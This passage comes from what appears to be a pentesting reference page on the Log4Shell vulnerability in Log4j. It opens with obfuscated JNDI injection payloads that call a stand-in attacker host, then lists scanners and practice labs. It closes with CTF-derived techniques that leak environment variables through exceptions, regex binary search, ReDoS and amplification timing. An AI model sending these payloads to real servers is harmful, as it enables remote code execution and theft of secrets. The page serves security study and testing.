<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">j</span><span class="o">}</span><span class="nl">ndi:</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">l</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">d</span><span class="o">}</span><span class="n">a</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">p</span><span class="o">}:</span><span class="c1">//attackerendpoint.com/}</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{::-</span><span class="n">j</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">n</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">d</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">i</span><span class="o">}:</span><span class="err">$</span><span class="o">{::-</span><span class="n">l</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">d</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">a</span><span class="o">}</span><span class="err">$</span><span class="o">{::-</span><span class="n">p</span><span class="o">}:</span><span class="c1">//attackerendpoint.com/z}</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">env:BARFOO:</span><span class="o">-</span><span class="n">j</span><span class="o">}</span><span class="n">ndi</span><span class="err">$</span><span class="o">{</span><span class="nl">env:BARFOO:</span><span class="o">-:}</span><span class="err">$</span><span class="o">{</span><span class="nl">env:BARFOO:</span><span class="o">-</span><span class="n">l</span><span class="o">}</span><span class="n">dap</span><span class="err">$</span><span class="o">{</span><span class="nl">env:BARFOO:</span><span class="o">-:}</span><span class="c1">//attackerendpoint.com/}</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">j</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">n</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">d</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">i</span><span class="o">}:</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">r</span><span class="o">}</span><span class="n">m</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">i</span><span class="o">}}:</span><span class="c1">//attackerendpoint.com/}</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{::-</span><span class="n">j</span><span class="o">}</span><span class="nl">ndi:rmi:</span><span class="c1">//attackerendpoint.com/} //Notice the use of rmi</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{::-</span><span class="n">j</span><span class="o">}</span><span class="nl">ndi:dns:</span><span class="c1">//attackerendpoint.com/} //Notice the use of dns</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">jnd</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="err">$</span><span class="o">{</span><span class="nl">upper:</span><span class="n">ı</span><span class="o">}}:</span><span class="nl">ldap:</span><span class="c1">//...} //Notice the unicode "i"</span>
</code></pre></div></div> <h3 id="automatic-scanners">Automatic Scanners</h3> <ul> <li><a href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a></li> <li><a href="https://github.com/adilsoybali/Log4j-RCE-Scanner">https://github.com/adilsoybali/Log4j-RCE-Scanner</a></li> <li><a href="https://github.com/silentsignal/burp-log4shell">https://github.com/silentsignal/burp-log4shell</a></li> <li><a href="https://github.com/cisagov/log4j-scanner">https://github.com/cisagov/log4j-scanner</a></li> <li><a href="https://github.com/Qualys/log4jscanwin">https://github.com/Qualys/log4jscanwin</a></li> <li><a href="https://github.com/hillu/local-log4j-vuln-scanner">https://github.com/hillu/local-log4j-vuln-scanner</a></li> <li><a href="https://github.com/logpresso/CVE-2021-44228-Scanner">https://github.com/logpresso/CVE-2021-44228-Scanner</a></li> <li><a href="https://github.com/palantir/log4j-sniffer">https://github.com/palantir/log4j-sniffer</a> - Find local vulnerable libraries</li> </ul> <h3 id="labs-to-test">Labs to test</h3> <ul> <li><a href="https://app.hackthebox.com/tracks/UHC-track"><strong>LogForge HTB machine</strong></a></li> <li><a href="https://tryhackme.com/room/solar"><strong>Try Hack Me Solar room</strong></a></li> <li><a href="https://github.com/leonjza/log4jpwn"><strong>https://github.com/leonjza/log4jpwn</strong></a></li> <li><a href="https://github.com/christophetd/log4shell-vulnerable-app"><strong>https://github.com/christophetd/log4shell-vulnerable-app</strong></a></li> </ul> <h2 id="post-log4shell-exploitation">Post-Log4Shell Exploitation</h2> <p>In this <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>CTF writeup</strong></a> is well explained how it’s potentially <strong>possible</strong> to <strong>abuse</strong> some features of <strong>Log4J</strong>.</p> <p>The <a href="https://logging.apache.org/log4j/2.x/security.html"><strong>security page</strong></a> of Log4j has some interesting sentences:</p> <blockquote> <p>From version 2.16.0 (for Java 8), the <strong>message lookups feature has been completely removed</strong>. <strong>Lookups in configuration still work</strong>. Furthermore, Log4j now disables access to JNDI by default. JNDI lookups in configuration now need to be enabled explicitly.</p> </blockquote> <blockquote> <p>From version 2.17.0, (and 2.12.3 and 2.3.1 for Java 7 and Java 6), <strong>only lookup strings in configuration are expanded recursively</strong>; in any other usage, only the top-level lookup is resolved, and any nested lookups are not resolved.</p> </blockquote> <p>This means that by default you can <strong>forget using any <code class="language-plaintext highlighter-rouge">jndi</code> exploit</strong>. Moreover, to perform <strong>recursive lookups</strong> you need to have them configure.</p> <p>For example, in that CTF this was configured in the file log4j2.xml:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">"Console"</span> <span class="na">target=</span><span class="s">"SYSTEM_ERR"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">"%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/PatternLayout&gt;</span>
<span class="nt">&lt;/Console&gt;</span>
</code></pre></div></div> <h3 id="env-lookups">Env Lookups</h3> <p>In <a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">this CTF</a> the attacker controlled the value of <code class="language-plaintext highlighter-rouge">${sys:cmd}</code> and needed to exfiltrate the flag from an environment variable.<br/> As seen in this page in <a href="jndi-java-naming-and-directory-interface-and-log4shell.md#verification"><strong>previous payloads</strong></a> there are different some ways to access env variables, such as: <strong><code class="language-plaintext highlighter-rouge">${env:FLAG}</code></strong>. In this CTF this was useless but it might not be in other real life scenarios.</p> <h3 id="exfiltration-in-exceptions">Exfiltration in Exceptions</h3> <p>In the CTF, you <strong>couldn’t access the stderr</strong> of the java application using log4J, but Log4J <strong>exceptions are sent to stdout</strong>, which was printed in the python app. This meant that triggering an exception we could access the content. An exception to exfiltrate the flag was: <strong><code class="language-plaintext highlighter-rouge">${java:${env:FLAG}}</code>.</strong> This works because <strong><code class="language-plaintext highlighter-rouge">${java:CTF{blahblah}}</code></strong> doesn’t exist and an exception with the value of the flag will be shown:</p> <p><img src="../../images/image (1023).png" alt=""/></p> <h3 id="conversion-patterns-exceptions">Conversion Patterns Exceptions</h3> <p>Just to mention it, you could also inject new <a href="https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout"><strong>conversion patterns</strong></a> and trigger exceptions that will be logged to <code class="language-plaintext highlighter-rouge">stdout</code>. For example:</p> <p><img src="../../images/image (683).png" alt=""/></p> <p>This wasn’t found useful to exfiltrate date inside the error message, because the lookup wasn’t solved before the conversion pattern, but it could be useful for other stuff such as detecting.</p> <h3 id="conversion-patterns-regexes">Conversion Patterns Regexes</h3> <p>However, it’s possible to use some <strong>conversion patterns that supports regexes</strong> to exfiltrate information from a lookup by using regexes and abusing <strong>binary search</strong> or <strong>time based</strong> behaviours.</p> <ul> <li><strong>Binary search via exception messages</strong></li> </ul> <p>The conversion pattern <strong><code class="language-plaintext highlighter-rouge">%replace</code></strong> can be use to <strong>replace</strong> <strong>content</strong> from a <strong>string</strong> even using <strong>regexes</strong>. It works like this: <code class="language-plaintext highlighter-rouge">replace{pattern}{regex}{substitution}</code><br/> Abusing this behaviour you could make replace <strong>trigger an exception if the regex matched</strong> anything inside the string (and no exception if it wasn’t found) like this:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%replace<span class="o">{</span><span class="k">${</span><span class="nv">env</span>:FLAG<span class="k">}</span><span class="o">}{</span>^CTF.<span class="k">*</span><span class="o">}{</span><span class="k">${</span><span class="nv">error</span><span class="k">}</span><span class="o">}</span>
<span class="c"># The string searched is the env FLAG, the regex searched is ^CTF.*</span>
<span class="c">## and ONLY if it's found ${error} will be resolved with will trigger an exception</span>
</code></pre></div></div> <ul> <li><strong>Time based</strong></li> </ul> <p>As it was mentioned in the previous section, <strong><code class="language-plaintext highlighter-rouge">%replace</code></strong> supports <strong>regexes</strong>. So it’s possible to use payload from the <a href="../regular-expression-denial-of-service-redos.md"><strong>ReDoS page</strong></a> to cause a <strong>timeout</strong> in case the flag is found.<br/> For example, a payload like <code class="language-plaintext highlighter-rouge">%replace{${env:FLAG}}{^(?=CTF)((.</code><em><code class="language-plaintext highlighter-rouge">)</code></em><code class="language-plaintext highlighter-rouge">)*salt$}{asd}</code> would trigger a <strong>timeout</strong> in that CTF.</p> <p>In this <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>writeup</strong></a>, instead of using a ReDoS attack it used an <strong>amplification attack</strong> to cause a time difference in the response:</p> <blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/%replace{
%replace{
%replace{
%replace{
%replace{
%replace{
%replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
</code></pre></div> </div> <p>If the flag starts with <code class="language-plaintext highlighter-rouge">flagGuess</code>, the whole flag is replaced with 29 <code class="language-plaintext highlighter-rouge">#</code>-s (I used this character because it would likely not be part of the flag). <strong>Each of the resulting 29 <code class="language-plaintext highlighter-rouge">#</code>-s is then replaced by 54 <code class="language-plaintext highlighter-rouge">#</code>-s</strong>. This process is repeated <strong>6 times</strong>, leading to a total of ` 29<em>54</em>54^6* =<code class="language-plaintext highlighter-rouge"></code> <code class="language-plaintext highlighter-rouge">**</code>96816014208<code class="language-plaintext highlighter-rouge">** **</code>#`-s!**</p> <p>Replacing so many <code class="language-plaintext highlighter-rouge">#</code>-s will trigger the 10-second timeout of the Flask application, which in turn will result in the HTTP status code 500 being sent to the user. (If the flag does not start with <code class="language-plaintext highlighter-rouge">flagGuess</code>, we will receive a non-500 status code)</p> </blockquote> <h2 id="references">References</h2> <ul> <li><a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/">https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/</a></li> <li><a href="https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/">https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/</a></li> <li><a href="https://www.youtube.com/watch?v=XG14EstTgQ4">https://www.youtube.com/watch?v=XG14EstTgQ4</a></li> <li><a href="https://tryhackme.com/room/solar">https://tryhackme.com/room/solar</a></li> <li><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">https://www.youtube.com/watch?v=Y8a5nB-vy78</a></li> <li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li> <li><a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/">https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/</a></li> <li><a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>